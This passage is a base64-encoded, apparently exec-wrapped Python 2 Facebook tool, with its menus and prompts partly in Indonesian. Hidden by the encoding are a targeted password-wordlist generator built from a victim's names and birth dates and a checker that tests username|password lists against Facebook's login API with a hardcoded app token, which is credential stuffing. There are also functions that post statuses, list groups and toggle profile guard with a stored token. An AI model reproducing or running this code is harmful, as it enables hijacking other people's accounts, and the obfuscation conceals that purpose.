ZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDQpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdyZXNldCcpCglwcmludCBsb2dvCgltc2c9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UeXBlIHN0YXR1cyBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWlmIG1zZyA9PSAiIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBEb24ndCBiZSBlbXB0eSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWxhaW4oKQoJZWxzZToKCQlyZXMgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/bWV0aG9kPVBPU1QmbWVzc2FnZT0iK21zZysiJmFjY2Vzc190b2tlbj0iK3Rva2V0KQoJCW9wID0ganNvbi5sb2FkcyhyZXMudGV4dCkKCQlqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1DcmVhdGUgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU3RhdHVzIElEXDAzM1sxOzkxbSA6IFwwMzNbMTs5N20iK29wWydpZCddCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCQkKIyMjIyMjIyMjIyMgQ1JFQVRFIFdPUkRMSVNUICMjIyMjIyMjIyMKZGVmIHdvcmRsaXN0KCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNCkKCQlsb2dpbigpCgl0cnk6CgkJb3Muc3lzdGVtKCdyZXNldCcpCgkJcHJpbnQgbG9nbwoJCXByaW50ICJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5Mm1GaWxsIGluIHRoZSBjb21wbGV0ZSBkYXRhIG9mIHRoZSB0YXJnZXQgYmVsb3ciCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJYSA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTmFtYSBEZXBhbiBcMDMzWzE7OTdtOiAiKQoJCWZpbGUgPSBvcGVuKGErIi50eHQiLCAndycpCgkJYj1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybU5hbWEgVGVuZ2FoIFwwMzNbMTs5N206ICIpCgkJYz1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybU5hbWEgQmVsYWthbmcgXDAzM1sxOzk3bTogIikKCQlkPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTmFtYSBQYW5nZ2lsYW4gXDAzM1sxOzk3bTogIikKCQllPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVGFuZ2dhbCBMYWhpciA+XDAzM1sxOzk2bWV4OiB8RERNTVlZfCBcMDMzWzE7OTdtOiAiKQoJCWY9ZVswOjJdCgkJZz1lWzI6NF0KCQloPWVbNDpdCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQoIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkzbUthbG8gSm9tYmxvIFNLSVAgYWphIDp2IikKCQlpPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTmFtYSBQYWNhciBcMDMzWzE7OTdtOiAiKQoJCWo9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1OYW1hIFBhbmdnaWxhbiBQYWNhciBcMDMzWzE7OTdtOiAiKQoJCWs9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UYW5nZ2FsIExhaGlyIFBhY2FyID5cMDMzWzE7OTZtZXg6IHxERE1NWVl8IFwwMzNbMTs5N206ICIpCgkJamFsYW4oJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtQ3JlYXRlIFwwMzNbMTs5N20uLi4nKQoJCWw9a1swOjJdCgkJbT1rWzI6NF0KCQluPWtbNDpdCgkJZmlsZS53cml0ZSgiJXMlc1xuJXMlcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyIgJSAoYSxjLGEsYixiLGEsYixjLGMsYSxjLGIsYSxhLGIsYixjLGMsYSxkLGIsZCxjLGQsZCxkLGQsYSxkLGIsZCxjLGEsZSxhLGYsYSxnLGEsaCxiLGUsYixmLGIsZyxiLGgsYyxlLGMsZixjLGcsYyxoLGQsZSxkLGYsZCxnLGQsaCxlLGEsZixhLGcsYSxoLGEsZSxiLGYsYixnLGIsaCxiLGUsYyxmLGMsZyxjLGgsYyxlLGQsZixkLGcsZCxoLGQsZCxkLGEsZixnLGEsZyxoLGYsZyxmLGgsZixmLGcsZixnLGgsZyxnLGgsZixoLGcsaCxoLGgsZyxmLGEsZyxoLGIsZixnLGIsZyxoLGMsZixnLGMsZyxoLGQsZixnLGQsZyxoLGEsaSxhLGosYSxrLGksZSxpLGosaSxrLGIsaSxiLGosYixrLGMsaSxjLGosYyxrLGUsayxqLGEsaixiLGosYyxqLGQsaixqLGssYSxrLGIsayxjLGssZCxrLGssaSxsLGksbSxpLG4saixsLGosbSxqLG4saixrKSkKCQl3ZyA9IDAKCQl3aGlsZSAod2cgPCAxMDApOgoJCQl3ZyA9IHdnICsgMQoJCQlmaWxlLndyaXRlKGEgKyBzdHIod2cpICsgJ1xuJykKCQllbiA9IDAKCQl3aGlsZSAoZW4gPCAxMDApOgoJCQllbiA9IGVuICsgMQoJCQlmaWxlLndyaXRlKGkgKyBzdHIoZW4pICsgJ1xuJykKCQl3b3JkID0gMAoJCXdoaWxlICh3b3JkIDwgMTAwKToKCQkJd29yZCA9IHdvcmQgKyAxCgkJCWZpbGUud3JpdGUoZCArIHN0cih3b3JkKSArICdcbicpCgkJZ2VuID0gMAoJCXdoaWxlIChnZW4gPCAxMDApOgoJCQlnZW4gPSBnZW4gKyAxCgkJCWZpbGUud3JpdGUoaiArIHN0cihnZW4pICsgJ1xuJykKCQlmaWxlLmNsb3NlKCkKCQl0aW1lLnNsZWVwKDQpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgKCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtICVzLnR4dCIgJWEpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWV4Y2VwdCBJT0Vycm9yLCBlOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIEZhaWxlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCiMjIyMjIENIRUNLRVIgIyMjIyMKZGVmIGNoZWNrX2FrdW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUNyZWF0ZSBpbiBmaWxlXDAzM1sxOzkxbSA6IFwwMzNbMTs5N211c2VybmFtZXxwYXNzd29yZCIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJbGl2ZSA9IFtdCgljZWsgPSBbXQoJZGllID0gW10KCXRyeToKCQlmaWxlID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHBhdGggXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgkJbGlzdCA9IG9wZW4oZmlsZSwncicpLnJlYWRsaW5lcygpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCAoIlwwMzNbMTs5MW1bIV0gRmlsZSBub3QgZm91bmQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCglwZW1pc2FoID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TZXBhcmF0b3IgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJZm9yIG1la2kgaW4gbGlzdDoKCQl1c2VybmFtZSwgcGFzc3dvcmQgPSAobWVraS5zdHJpcCgpKS5zcGxpdChzdHIocGVtaXNhaCkpCgkJdXJsID0gImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VybmFtZSkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzc3dvcmQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiCgkJZGF0YSA9IHJlcXVlc3RzLmdldCh1cmwpCgkJbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQoJCWlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6CgkJCWxpdmUuYXBwZW5kKHBhc3N3b3JkKQoJCQlwcmludCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtTGl2ZVwwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQKCQllbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWyJlcnJvcl9tc2ciXToKCQkJY2VrLmFwcGVuZChwYXNzd29yZCkKCQkJcHJpbnQiXDAzM1sxOzk3bVsgXDAzM1sxOzkzbUNoZWNrXDAzM1sxOzk3bSBdIFwwMzNbMTs5N20iK3VzZXJuYW1lKyJ8IitwYXNzd29yZAoJCWVsc2U6CgkJCWRpZS5hcHBlbmQocGFzc3dvcmQpCgkJCXByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5MW1EaWVcMDMzWzE7OTdtIF0gXDAzM1sxOzk3bSIrdXNlcm5hbWUrInwiK3Bhc3N3b3JkCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsXDAzM1sxOzkxbSA6IFwwMzNbMTs5N21MaXZlPVwwMzNbMTs5Mm0iK3N0cihsZW4obGl2ZSkpKyIgXDAzM1sxOzk3bUNoZWNrPVwwMzNbMTs5M20iK3N0cihsZW4oY2VrKSkrIiBcMDMzWzE7OTdtRGllPVwwMzNbMTs5MW0iK3N0cihsZW4oZGllKSkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCglsYWluKCkKCQojIyMjIyBHUlVQIFNBWUEgIyMjIyMKZGVmIGdydXBzYXlhKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXRyeToKCQl1aCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZ3JvdXBzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWd1ZCA9IGpzb24ubG9hZHModWgudGV4dCkKCQlmb3IgcCBpbiBndWRbJ2RhdGEnXToKCQkJbmFtYSA9IHBbIm5hbWUiXQoJCQlpZCA9IHBbImlkIl0KCQkJZj1vcGVuKCdvdXQvR3J1cGlkLnR4dCcsJ3cnKQoJCQlsaXN0Z3J1cC5hcHBlbmQoaWQpCgkJCWYud3JpdGUoaWQgKyAnXG4nKQoJCQlwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkybU15R3JvdXBcMDMzWzE7OTdtIF0gIitzdHIoaWQpKyIgPT4gIitzdHIobmFtYSkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJXMiJShsZW4obGlzdGdydXApKQoJCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0L0dydXBpZC50eHQiKQoJCWYuY2xvc2UoKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWxhaW4oKQoJZXhjZXB0IEtleUVycm9yOgoJCW9zLnJlbW92ZSgnb3V0L0dydXBpZC50eHQnKQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gQ29ubmVjdGlvbiIKCQlrZWx1YXIoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gRXJyb3IiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCQkKIyMjIyMgUFJPRklMIEdVQVJEICMjIyMjCmRlZiBndWFyZCgpOgoJZ2xvYmFsIHRva2V0Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoNCkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gTm90IGFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglnID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBnID09ICIxIjoKCQlha3RpZiA9ICJ0cnVlIgoJCWdheih0b2tldCwgYWt0aWYpCgllbGlmIGcgPT0gIjIiOgoJCW5vbiA9ICJmYWxzZSIKCQlnYXoodG9rZXQsIG5vbikKCWVsaWYgZyA9PSIwIjoKCQlsYWluKCkKCWVsaWYgZyA9PSIiOgoJCWtlbHVhcigpCgllbHNlOgoJCWtlbHVhcigpCgkKZGVmIGdldF91c2VyaWQodG9rZXQpOgoJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0lcyIldG9rZXQKCXJlcyA9IHJlcXVlc3RzLmdldCh1cmwpCgl1aWQgPSBqc29uLmxvYWRzKHJlcy50ZXh0KQoJcmV0dXJuIHVpZFsiaWQiXQoJCQpkZWYgZ2F6KHRva2V0LCBlbmFibGUgPSBUcnVlKToKCWlkID0gZ2V0X3VzZXJpZCh0b2tldCkKCWRhdGEgPSAndmFyaWFibGVzPXsiMCI6eyJpc19zaGllbGRlZCI6ICVzLCJzZXNzaW9uX2lkIjoiOWI3ODE5MWMtODRmZC00YWI2LWIwYWEtMTliMzlmMDRhNmJjIiwiYWN0b3JfaWQiOiIlcyIsImNsaWVudF9tdXRhdGlvbl9pZCI6ImIwMzE2ZGQ2LTNmZDYtNGJlYi1hZWQ0LWJiMjljNWRjNjRiMCJ9fSZtZXRob2Q9cG9zdCZkb2NfaWQ9MTQ3NzA0MzI5MjM2NzE4MyZxdWVyeV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZzdHJpcF9kZWZhdWx0cz10cnVlJnN0cmlwX251bGxzPXRydWUmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZmYl9hcGlfY2FsbGVyX2NsYXNzPUlzU2hpZWxkZWRTZXRNdXRhdGlvbicgJSAoZW5hYmxlLCBzdHIoaWQpKQoJaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAiQXV0aG9yaXphdGlvbiIgOiAiT0F1dGggJXMiICUgdG9rZXR9Cgl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JhcGhxbCIKCXJlcyA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhID0gZGF0YSwgaGVhZGVycyA9IGhlYWRlcnMpCglwcmludChyZXMudGV4dCkKCWlmICciaXNfc2hpZWxkZWQiOnRydWUnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQWN0aXZhdGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWVsaWYgJyJpc19zaGllbGRlZCI6ZmFsc2UnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTFtTm90IGFjdGl2YXRlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIEVycm9yIgoJCWtlbHVhcigpCgkKYW4oKQo="))